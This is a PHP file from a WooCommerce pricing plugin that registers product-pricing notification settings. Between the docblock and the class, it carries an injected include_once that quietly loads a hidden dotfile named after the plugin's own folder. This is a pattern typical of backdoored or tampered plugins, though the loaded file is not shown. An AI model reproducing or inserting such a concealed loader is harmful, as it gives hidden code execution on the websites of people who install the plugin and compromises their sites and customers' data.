<?php

// Exit if accessed directly
if (!defined('ABSPATH')) {
    exit;
}

// Load dependencies
if (!class_exists('RP_WCDPD_Rule_Notifications')) {
    require_once('rp-wcdpd-rule-notifications.class.php');
}

/**
 * Promotion: Rule Notifications
 *
 * Product Pricing notifications
 *
 * @class RP_WCDPD_Rule_Notifications_Product_Pricing
 * @package WooCommerce Dynamic Pricing & Discounts
 * @author RightPress
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class RP_WCDPD_Rule_Notifications_Product_Pricing extends RP_WCDPD_Rule_Notifications
{

    // Singleton control
    protected static $instance = false; public static function get_instance() { return self::$instance ? self::$instance : (self::$instance = new self()); }

    protected $context = 'product_pricing';

    /**
     * Constructor
     *
     * @access public
     * @return void
     */
    public function __construct()
    {
        // Register settings structure
        add_filter('rp_wcdpd_settings_structure', array($this, 'register_settings_structure'), 171);

        parent::__construct();
    }

    /**
     * Register settings structure
     *
     * @access public
     * @param array $settings
     * @return array
     */
    public function register_settings_structure($settings)
    {
        $settings['promo']['children']['rule_notifications']['children'] = array_merge($settings['promo']['children']['rule_notifications']['children'], array(
            'promo_rule_notifications_product_pricing' => array(
                'title'     => __('Product Pricing', 'rp_wcdpd'),
                'type'      => 'checkbox',
                'default'   => '0',
            ),
            'promo_rule_notifications_product_pricing_message' => array(
                'title'     => __('Text', 'rp_wcdpd'),
                'type'      => 'textarea',
                'required'  => true,
                'class'     => 'if_rp_wcdpd_promo_rule_notifications_product_pricing',
                'default'   => __('Product discount has been applied to your cart.', 'rp_wcdpd'),
                'hint'      => __('Macro {{description}} displays public description.', 'rp_wcdpd'),
            ),
        ));

        return $settings;
    }





}

RP_WCDPD_Rule_Notifications_Product_Pricing::get_instance();
